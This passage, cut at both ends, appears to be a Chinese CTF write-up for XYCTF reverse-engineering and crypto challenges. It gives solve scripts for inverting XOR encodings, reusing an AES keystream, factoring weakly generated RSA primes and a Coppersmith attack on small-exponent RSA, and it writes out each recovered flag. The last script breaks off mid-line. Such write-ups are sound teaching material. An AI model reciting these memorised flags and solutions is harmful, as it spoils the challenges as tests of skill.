class="line">0000E808.text:0000558B201D13F2jnz     short loc_558B201D1473</span><br><span class="line">0000E808.text:0000558B201D13F4mov     eax, r8dRAX=0000000000000079</span><br><span class="line">0000E808.text:0000558B201D13F7add     rsp, 48hRSP=00007FFCB17CE168 PF=0 ZF=0</span><br><span class="line">0000E808.text:0000558B201D13FBretnRSP=00007FFCB17CE170</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># inp[i]^=(i+6)^0x66</span></span><br><span class="line"><span class="comment"># inp[i]-=6</span></span><br><span class="line"><span class="comment"># inp[i]^=key[i]</span></span><br></pre></td></tr></table></figure><p>那直接逆</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">last = [<span class="number">0x69</span>, <span class="number">0x58</span>, <span class="number">0x61</span>, <span class="number">0x63</span>, <span class="number">0x67</span>, <span class="number">0x4C</span>, <span class="number">0x4D</span>, <span class="number">0x32</span>, <span class="number">0x98</span>, <span class="number">0x20</span>, <span class="number">0x4D</span>, <span class="number">0x51</span>, <span class="number">0x7B</span>, <span class="number">0x25</span>, <span class="number">0x75</span>, <span class="number">0x51</span>, <span class="number">0xA3</span>, <span class="number">0x58</span>, <span class="number">0x60</span>, <span class="number">0x72</span>, <span class="number">0x42</span>, <span class="number">0x62</span>, <span class="number">0x67</span>, <span class="number">0x66</span>, <span class="number">0x37</span>, <span class="number">0x6C</span>, <span class="number">0x30</span>, <span class="number">0x46</span>, <span class="number">0x66</span>, <span class="number">0x4F</span>, <span class="number">0x5D</span>, <span class="number">0x03</span>, <span class="number">0x5D</span>, <span class="number">0xA4</span>, <span class="number">0x66</span>, <span class="number">0x01</span>, <span class="number">0x43</span>, <span class="number">0x68</span>, <span class="number">0x7D</span>, <span class="number">0x7C</span>, <span class="number">0x55</span>, <span class="number">0x4F</span>, <span class="number">0x7A</span>, <span class="number">0x3F</span>, <span class="number">0x6C</span>, <span class="number">0x12</span>, <span class="number">0x21</span>, <span class="number">0x09</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># inp[i]^=i^0x66</span></span><br><span class="line"><span class="comment"># inp[i]-=6</span></span><br><span class="line"><span class="comment"># inp[i]^=key[i]</span></span><br><span class="line">key = <span class="string">&quot;i_have_get_shell_but_where_is_you_my_dear_baby!!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(last)):</span><br><span class="line">    last[i]^=<span class="built_in">ord</span>(key[i])</span><br><span class="line">    last[i]+=<span class="number">6</span></span><br><span class="line">    last[i]^=(<span class="number">6</span>+i)^<span class="number">0x66</span></span><br><span class="line">        </span><br><span class="line">pl(last)</span><br><span class="line"><span class="comment"># flag&#123;Br0k3n_m3m0r1es_for3v3r_Sh1n@_1n_The_H3@$T&#125;</span></span><br></pre></td></tr></table></figure><h4 id="舔狗四部曲–我的白月光">舔狗四部曲–我的白月光</h4><p>一开头给了flag{L0v3_</p><p>然后分析一下主函数，发现最后有一个base64，拿去解一下，发现解不出来，然后尝试一下是不是反向了什么的</p><p>在cyberchef里面直接</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">reverse</span>+<span class="keyword">from</span> base64+<span class="built_in">reverse</span>+<span class="keyword">from</span> hex</span><br><span class="line">得到</span><br><span class="line"><span class="variable">_memory_never_go_done_finally_thankyou_xiaowangtongxue</span>&#125;</span><br></pre></td></tr></table></figure><p>然后再看一下中间还干了什么</p><p>看到有一个</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !(_DWORD)v22 )</span><br><span class="line">&#123;</span><br><span class="line">  flOldProtect[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  VirtualProtect(v11, <span class="number">8u</span>i64, <span class="number">4u</span>, flOldProtect);</span><br><span class="line">  *v11 = sub_7FF64A841470;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个sub好像很可疑，直接set ip 过去，在执行完函数后，在对应的hex窗口找到</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i8_<span class="built_in">a_k3y</span>_and</span><br></pre></td></tr></table></figure><p>最后</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;L0v3_i8_<span class="built_in">a_k3y</span>_and_memory_never_go_done_finally_thankyou_xiaowangtongxue&#125;</span><br></pre></td></tr></table></figure><h2 id="crypto">crypto</h2><h3 id="week1-2">week1</h3><h4 id="Sign1n">Sign1n</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">flag=<span class="string">b&#x27;XYCTF&#123;108376aa-c3ed-4e02-a915-47d9ea406612&#125;&#x27;</span></span><br><span class="line">flag=bytes_to_long(flag)</span><br><span class="line">leak=<span class="built_in">bin</span>(<span class="built_in">int</span>(flag))</span><br><span class="line"><span class="built_in">print</span>(leak)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    leak += <span class="string">&quot;0&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(leak) == <span class="number">514</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">swap_bits</span>(<span class="params">input_str</span>):</span><br><span class="line">    input_list = <span class="built_in">list</span>(input_str[<span class="number">2</span>:])</span><br><span class="line">    length = <span class="built_in">len</span>(input_list)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length // <span class="number">2</span>):</span><br><span class="line">        temp = input_list[i]</span><br><span class="line">        input_list[i] = input_list[length - <span class="number">1</span> - i]</span><br><span class="line">        input_list[length - <span class="number">1</span> - i] = temp</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(input_list)</span><br><span class="line"></span><br><span class="line">input_str = leak</span><br><span class="line">result = swap_bits(input_str)</span><br><span class="line">a=result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_add</span>(<span class="params">input_str</span>):</span><br><span class="line">    input_list = <span class="built_in">list</span>(input_str)</span><br><span class="line">    length = <span class="built_in">len</span>(input_list)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        input_list[i] = <span class="built_in">str</span>((<span class="built_in">int</span>(input_list[i]) + i + <span class="number">1</span>) % <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span>.join(input_list)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">input_str = a</span><br><span class="line">result = custom_add(input_str)</span><br><span class="line">b=result</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"><span class="comment">#12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567891134567790113445679902334677900134557889122356678001344567801223566790013355689912235667901134457889023355788001344578891133467799012455778012235578800134456899022346779011344567991223557880012346788902335667900134456899122355788001245578891133566780013445678012235577801123557889112456678011245578801233467789112355779912234577990233556780113</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>既然是对每一位的单独加密，那就直接爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">llll   = <span class="number">12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567891134567790113445679902334677900134557889122356678001344567801223566790013355689912235667901134457889023355788001344578891133467799012455778012235578800134456899022346779011344567991223557880012346788902335667900134456899122355788001245578891133566780013445678012235577801123557889112456678011245578801233467789112355779912234577990233556780113</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">out</span>(<span class="params">input_str</span>):</span><br><span class="line">    input_list = <span class="built_in">list</span>(<span class="built_in">str</span>(input_str))</span><br><span class="line">    length = <span class="built_in">len</span>(input_list)</span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            <span class="keyword">if</span> (input_list[i] == <span class="built_in">str</span>((k + i + <span class="number">1</span>) % <span class="number">10</span>)):</span><br><span class="line">                res+=(<span class="built_in">str</span>(k))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">nex = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">reversed</span>(out(llll)))</span><br><span class="line"><span class="comment"># print(nex)</span></span><br><span class="line">nex = <span class="string">&#x27;0b&#x27;</span>+nex[:<span class="number">343</span>]</span><br><span class="line"><span class="comment"># print(nex)</span></span><br><span class="line">y = <span class="built_in">int</span>(nex,<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(y))</span><br><span class="line"><span class="comment"># XYCTF&#123;f94e8256-6368-47bc-9ae3-c73e382376d7&#125;</span></span><br></pre></td></tr></table></figure><h4 id="x0r">x0r</h4><p>是AES的选择明文攻击，由于是异或得到结果，那就可以直接截获每一次的密钥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="comment"># 密钥块</span></span><br><span class="line"><span class="comment"># 输入1后得到的前32个字符和后96个字符</span></span><br><span class="line"><span class="comment"># 输入2后输入前32个字符，然后输入000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="comment"># 得到的输出放到这里</span></span><br><span class="line">key_blocks_hex = <span class="string">&#x27;69d174fb2dd82fc3ad184efde51b3a6673027ef1d3a49dbf955d2f62759b1a5924381fb190dd70c5957c7e395311272c&#x27;</span></span><br><span class="line">key_blocks = <span class="built_in">bytes</span>.fromhex(key_blocks_hex)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 密文</span></span><br><span class="line"><span class="comment"># 输入1后得到的前32个字符和后96个字符</span></span><br><span class="line"><span class="comment"># 放后96个字符</span></span><br><span class="line">ciphertext_hex = <span class="string">&#x27;318837af6ba319a69b7d78c9d67d175e11644bdce7c0ab88b83c1f0642b6783c175929d5a7be12a0f11f033357152328&#x27;</span></span><br><span class="line">ciphertext = <span class="built_in">bytes</span>.fromhex(ciphertext_hex)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">plaintext = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ciphertext), AES.block_size):</span><br><span class="line">    key_block = key_blocks[i:i+AES.block_size]</span><br><span class="line">    ciphertext_block = ciphertext[i:i+AES.block_size]</span><br><span class="line">    plaintext_block = <span class="built_in">bytes</span>(a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(ciphertext_block, key_block))</span><br><span class="line">    plaintext += plaintext_block</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(plaintext)</span><br><span class="line"><span class="comment"># XYCTF&#123;6e6e643f-8bf5-4d67-a0d7-be3a6d7cbedc&#125;</span></span><br></pre></td></tr></table></figure><h4 id="happy-to-solve1">happy_to_solve1</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_happy_prime</span>():</span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = sympy.nextprime(p ^ ((<span class="number">1</span> &lt;&lt; <span class="number">512</span>) - <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p, q = get_happy_prime()</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(m, e, n))</span><br></pre></td></tr></table></figure><p>我们知道q是p异或11111…的结果，那么p+q就约等于2**512</p><p>我们可以根据这个和pq乘积两个等式尝试寻找p和q</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal, getcontext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_pq</span>(<span class="params">suma, mula</span>):</span><br><span class="line">    <span class="comment"># 设置精度</span></span><br><span class="line">    getcontext().prec = <span class="number">200</span></span><br><span class="line">    <span class="comment"># 计算判别式</span></span><br><span class="line">    discriminant = Decimal(suma**<span class="number">2</span> - <span class="number">4</span>*mula).sqrt()</span><br><span class="line">    <span class="comment"># 计算 p 和 q 的值</span></span><br><span class="line">    p = (suma + discriminant) / <span class="number">2</span></span><br><span class="line">    q = (suma - discriminant) / <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试</span></span><br><span class="line">suma = <span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">512</span>)-<span class="number">1</span></span><br><span class="line">mula = <span class="number">24852206647750545040640868093921252282805229864862413863025873203291042799096787789288461426555716785288286492530194901130042940279109598071958012303179823645151637759103558737126271435636657767272703908384802528366090871653024192321398785017073393201385586868836278447340624427705360349350604325533927890879</span></span><br><span class="line">n=<span class="number">24852206647750545040640868093921252282805229864862413863025873203291042799096787789288461426555716785288286492530194901130042940279109598071958012303179823645151637759103558737126271435636657767272703908384802528366090871653024192321398785017073393201385586868836278447340624427705360349350604325533927890879</span></span><br><span class="line"></span><br><span class="line">p, q = solve_pq(suma, mula)</span><br><span class="line"><span class="comment"># print(f&quot;p = &#123;Decimal(p):.2f&#125;, q = &#123;Decimal(q):.2f&#125;&quot;)</span></span><br><span class="line"><span class="comment"># print(sympy.nextprime(p))</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span>((n%p)!=<span class="number">0</span>):</span><br><span class="line">        p = sympy.nextprime(p)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">q = n // p</span><br><span class="line">c = <span class="number">14767985399473111932544176852718061186100743117407141435994374261886396781040934632110608219482140465671269958180849886097491653105939368395716596413352563005027867546585191103214650790884720729601171517615620202183534021987618146862260558624458833387692782722514796407503120297235224234298891794056695442287</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">phi =(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d = <span class="built_in">pow</span>(e,-<span class="number">1</span>,phi)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># XYCTF&#123;3f22f4efe3bbbc71bbcc999a0a622a1a23303cdc&#125;</span></span><br></pre></td></tr></table></figure><h4 id="反方向的密码-相思">反方向的密码 相思</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hash</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.sha256(x.encode()).digest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">message</span>):</span><br><span class="line">    <span class="keyword">return</span> message + <span class="built_in">hash</span>(<span class="built_in">str</span>(<span class="built_in">len</span>(message)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(pad(flag))</span><br><span class="line">p = getStrongPrime(<span class="number">512</span>)</span><br><span class="line">q = getStrongPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(m, e, n))</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="comment"># 120440199294949712392334113337541924034371176306546446428347114627162894108760435789068328282135879182130546564535108930827440004987170619301799710272329673259390065147556073101312748104743572369383346039000998822862286001416166288971531241789864076857299162050026949096919395896174243383291126202796610039053</span></span><br><span class="line"><span class="comment"># 143413213355903851638663645270518081058249439863120739973910994223793329606595495141951165221740599158773181585002460087410975579141155680671886930801733174300593785562287068287654547100320094291092508723488470015821072834947151827362715749438612812148855627557719115676595686347541785037035334177162406305243</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>相当于已知m低位，用Coppersmith定理可解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = <span class="number">0x3</span></span><br><span class="line">n = <span class="number">143413213355903851638663645270518081058249439863120739973910994223793329606595495141951165221740599158773181585002460087410975579141155680671886930801733174300593785562287068287654547100320094291092508723488470015821072834947151827362715749438612812148855627557719115676595686347541785037035334177162406305243</span></span><br><span class="line">c = <span class="number">120440199294949712392334113337541924034371176306546446428347114627162894108760435789068328282135879182130546564535108930827440004987170619301799710272329673259390065147556073101312748104743572369383346039000998822862286001416166288971531241789864076857299162050026949096919395896174243383291126202796610039053</span></span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = PolynomialRing(Zmod(n), implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>,<span class="number">50</span>):</span><br><span class="line">    low = <span class="built_in">int</span>(hashlib.sha256(<span class="built_in">str</span>(i).encode()).hexdigest(), <span class="number">16</span>)</span><br><span class="line">    m = low + x*<span class="number">2</span>**<span class="number">256</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    roots = (m**<span class="number">3</span> - c).monic().small_roots(X=<span class="number">2</span>**(i*<span class="number">8</span>),beta=<span class="number">0.4</span>,epsilon=<span class="number">0.01</span>)</span><br><span class="line">    <span class="keyword">if</span> roots:</span><br><span class="line">        M = m(roots[<span class="number">0</span>])</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(M))[:i])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># XYCTF&#123;!__d3ng__hu0__1@n__3h@n__Chu__!&#125;</span></span><br></pre></td></tr></table></figure><p>一开始怎么都爆不出来，结果发现是epsilon取大了，还没规定上下界（这个X=X=2**(i*8)就是确定为flag的长度的）,这样就要写m = low + x*2**256。不然会撞上下界</p><h3 id="week2-2">week2</h3><h4 id="Sign1n-Revenge">Sign1n_Revenge</h4><p>和signin一样，不写了</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">flag</span>&#123;<span class="number">09</span>c24f8d-dbf8-<span class="number">463</span>b-a16f-<span class="number">3</span>dbc47e4a726&#125;</span><br></pre></td></tr></table></figure><h4 id="happy-to-solve2">happy_to_solve2</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_happy_prime</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        p = <span class="built_in">int</span>(<span class="string">&quot;&quot;</span>.join([random.choice(<span class="string">&quot;123&quot;</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">512</span>)]))</span><br><span class="line">        q = <span class="built_in">int</span>(<span class="string">&quot;&quot;</span>.join([random.choice(<span class="string">&quot;567&quot;</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">512</span>)]))</span><br><span class="line">        <span class="keyword">if</span> isPrime(p) <span class="keyword">and</span> isPrime(q):</span><br><span class="line">            <span class="keyword">return</span> (p,q)</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p ,q= get_happy_prime()</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(m, e, n))</span><br></pre></td></tr></table></figure><p>这个p和q每一位既然只有3种选择，那就可以从最低位开始爆破出p和q的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># # 乘积n</span></span><br><span class="line">n = <span 